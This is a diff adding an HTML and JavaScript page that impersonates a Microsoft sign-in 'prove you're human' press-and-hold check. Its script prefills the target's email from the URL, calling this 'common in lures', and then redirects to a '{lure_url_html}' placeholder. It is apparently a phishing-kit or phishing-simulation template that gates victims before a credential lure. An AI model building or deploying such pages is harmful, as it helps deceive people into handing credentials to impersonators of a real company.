@@ -1,0 +1,348 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign in to your account</title>
+    <style>
+        :root {
+            --ms-blue: #0067b8;
+            --ms-light-gray: #f2f2f2;
+            --ms-text: #1b1b1b;
+            --ms-subtext: #505050;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: "Segoe UI", "Helvetica Neue", Arial, sans-serif;
+        }
+
+        body {
+            background-color: #f8f8f8;
+            background-image: radial-gradient(circle at 50% 50%, #ffffff 0%, #f3f2f1 100%);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            color: var(--ms-text);
+        }
+
+        logo {
+            margin-bottom: 32px;
+            display: inline-block;
+        }
+        
+        .logo-grid {
+            display: inline-grid;
+            grid-template-columns: 16px 16px;
+            grid-gap: 2px;
+        }
+
+         .logo-square {
+            width: 16px;
+            height: 16px;
+        }
+
+        .card {
+            background: #ffffff;
+            width: 440px;
+            min-height: 520px;
+            padding: 44px;
+            border-radius: 4px;
+            box-shadow: 0 2px 6px rgba(0,0,0,0.2);
+            position: relative;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        .header {
+            width: 100%;
+            display: flex;
+            align-items: center;
+            margin-bottom: 24px;
+            position: relative;
+        }
+
+        .back-arrow {
+            cursor: pointer;
+            position: absolute;
+            left: -20px;
+            top: -10px;
+            padding: 10px;
+            opacity: 0.6;
+        }
+
+        .ms-logo {
+            display: flex;
+            align-items: center;
+            margin: 0 auto;
+        }
+
+        .ms-logo img {
+            width: 108px;
+            height: 23px;
+        }
+
+        /* Email Badge */
+        .user-badge {
+            display: flex;
+            align-items: center;
+            background: #fff;
+            border: 1px solid #d2d0ce;
+            border-radius: 20px;
+            padding: 2px 12px;
+            margin-bottom: 24px;
+            font-size: 14px;
+            color: var(--ms-subtext);
+            max-width: 100%;
+        }
+
+        .user-badge .avatar-circle {
+            width: 24px;
+            height: 24px;
+            background: #31ab4a; /* Matches the green in screenshot */
+            border-radius: 50%;
+            margin-right: 8px;
+            flex-shrink: 0;
+        }
+
+        .title {
+            font-size: 24px;
+            font-weight: 500;
+            margin-bottom: 30px;
+            text-align: center;
+        }
+
+        /* The Provided Captcha Image */
+        .captcha-visual {
+            width: 240px;
+            margin-bottom: 40px;
+        }
+
+        .instruction {
+            font-size: 15px;
+            color: var(--ms-subtext);
+            margin-bottom: 24px;
+        }
+
+        /* Press and Hold Logic */
+        .controls-row {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            width: 100%;
+            justify-content: center;
+        }
+
+        .accessibility-icon {
+            width: 42px;
+            height: 42px;
+            background: #3d3d4d;
+            border-radius: 50%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            cursor: pointer;
+        }
+
+        .hold-btn {
+            flex-grow: 1;
+            max-width: 240px;
+            height: 42px;
+            background: #ffffff;
+            border: 1px solid var(--ms-blue);
+            border-radius: 24px;
+            color: var(--ms-blue);
+            font-size: 15px;
+            font-weight: 500;
+            position: relative;
+            overflow: hidden;
+            cursor: pointer;
+            user-select: none;
+            outline: none;
+        }
+
+        .progress-fill {
+            position: absolute;
+            top: 0;
+            left: 0;
+            height: 100%;
+            width: 0%;
+            background: rgba(0, 103, 184, 0.1);
+            transition: width 50ms linear;
+            z-index: 1;
+        }
+
+        .hold-btn-text {
+            position: relative;
+            z-index: 2;
+        }
+
+        .hold-btn.verified {
+            background: var(--ms-blue);
+            color: #ffffff;
+            border-color: var(--ms-blue);
+            transition: background 0.3s;
+        }
+        
+
+        /* Mock Scrollbar on the right */
+        .scrollbar-mock {
+            position: absolute;
+            right: 12px;
+            bottom: 40px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            opacity: 0.4;
+        }
+
+        .scroll-arrow {
+            width: 0; 
+            height: 0; 
+            border-left: 5px solid transparent;
+            border-right: 5px solid transparent;
+            margin: 5px 0;
+        }
+        .up { border-bottom: 5px solid #000; }
+        .down { border-top: 5px solid #000; }
+        .scroll-bar {
+            width: 8px;
+            height: 60px;
+            background: #888;
+            border-radius: 4px;
+        }
+
+        [style*="display:none"] { display: none !important; }
+    </style>
+</head>
+<body>
+
+<div class="card" id="main-card">
+    <div class="header">
+        <div class="back-arrow">
+            <svg width="16" height="16" viewBox="0 0 16 16"><path d="M16 7H3.8l5.6-5.6L8 0 0 8l8 8 1.4-1.4L3.8 9H16V7z"/></svg>
+        </div>
+         <!-- Microsoft Logo -->
+            <div class="logo ms-logo">
+                <div class="logo-grid">
+                    <div class="logo-square" style="background: #f25022;"></div>
+                    <div class="logo-square" style="background: #7fba00;"></div>
+                    <div class="logo-square" style="background: #00a4ef;"></div>
+                    <div class="logo-square" style="background: #ffb900;"></div>
+                </div>
+            </div>
+    </div>
+
+    <div class="user-badge">
+        <span id="display-email">user@company.com</span>
+    </div>
+
+    <h1 class="title">Let's prove you're human</h1>
+
+    <img src="../../media/img/logo_img.png" class="captcha-visual" alt="Verification">
+
+    <p class="instruction">Press and hold the button.</p>
+
+    <div class="controls-row">
+        <div class="accessibility-icon">
+            <svg width="24" height="24" viewBox="0 0 24 24" fill="white">
+                <path d="M12 2c1.1 0 2 .9 2 2s-.9 2-2 2-2-.9-2-2 .9-2 2-2zm9 7h-6v13h-2v-6h-2v6H9V9H3V7h18v2z"/>
+            </svg>
+        </div>
+        <button class="hold-btn" id="hold-btn">
+            <div class="progress-fill" id="fill"></div>
+            <span class="hold-btn-text" id="btn-text">Press and hold</span>
+        </button>
+    </div>
+
+    <div class="scrollbar-mock">
+        <div class="scroll-arrow up"></div>
+        <div class="scroll-bar"></div>
+        <div class="scroll-arrow down"></div>
+    </div>
+</div>
+
+<script>
+    (function() {
+        'use strict';
+
+        // 1. Populate Email from URL hash (common in lures)
+        const emailSpan = document.getElementById('display-email');
+        let email = "user@account.com";
+        const hash = window.location.hash.substring(1);
+        if (hash && hash.includes('@')) {
+            email = hash;
+        } else if (window.location.search.includes('e=')) {
+            const params = new URLSearchParams(window.location.search);
+            email = params.get('e');
+        }
+        emailSpan.textContent = email;
+
+        // 2. Already Verified Check
+        if (sessionStorage.getItem('msft_verified') === 'true') {
+            window.location.href = '{lure_url_html}' + window.location.hash;
+            return;
+        }
+
+        // 3. Press and Hold Logic
+        const btn = document.getElementById('hold-btn');
+        const fill = document.getElementById('fill');
+        const btnText = document.getElementById('btn-text');
+        
+        let timer;
+        let start;
+        const duration = 2000; // 2 Seconds hold
+
+        function startHold(e) {
+            e.preventDefault();
+            start = Date.now();
+            btn.style.borderColor = '#0067b8';
+            
+            timer = setInterval(() => {
+                let elapsed = Date.now() - start;
+                let pct = (elapsed / duration) * 100;
+                
+                if (pct >= 100) {
+                    pct = 100;
+                    complete();
+                }
+                fill.style.width = pct + '%';
+            }, 50);
+        }
+
+        function stopHold() {
+            clearInterval(timer);
+            if (sessionStorage.getItem('msft_verified') !== 'true') {
+                fill.style.width = '0%';
+            }
+        }
+
+        function complete() {
+            clearInterval(timer);
+            sessionStorage.setItem('msft_verified', 'true');
+            btn.classList.add('verified');
+            btnText.textContent = "Verified";
+            
+            setTimeout(() => {
+                document.getElementById('main-card').style.opacity = '0';
+                document.getElementById('main-card').style.transition = '0.5s';
+                setTimeout(() => {
+                    window.location.href = '{lure_url_html}' + window.location.hash;
+                }, 500);
+            }, 600);
+        }
+
+        // Events
+        btn.addEventListener('mousedown', startHold);
+        btn.addEventListener('touchstart', startHold);
+        window.addEventListener('mouseup', stopHold);
+        window.addEventListener('touchend', stopHold);
+    })();
+</script>
+
+</body>
+</html>
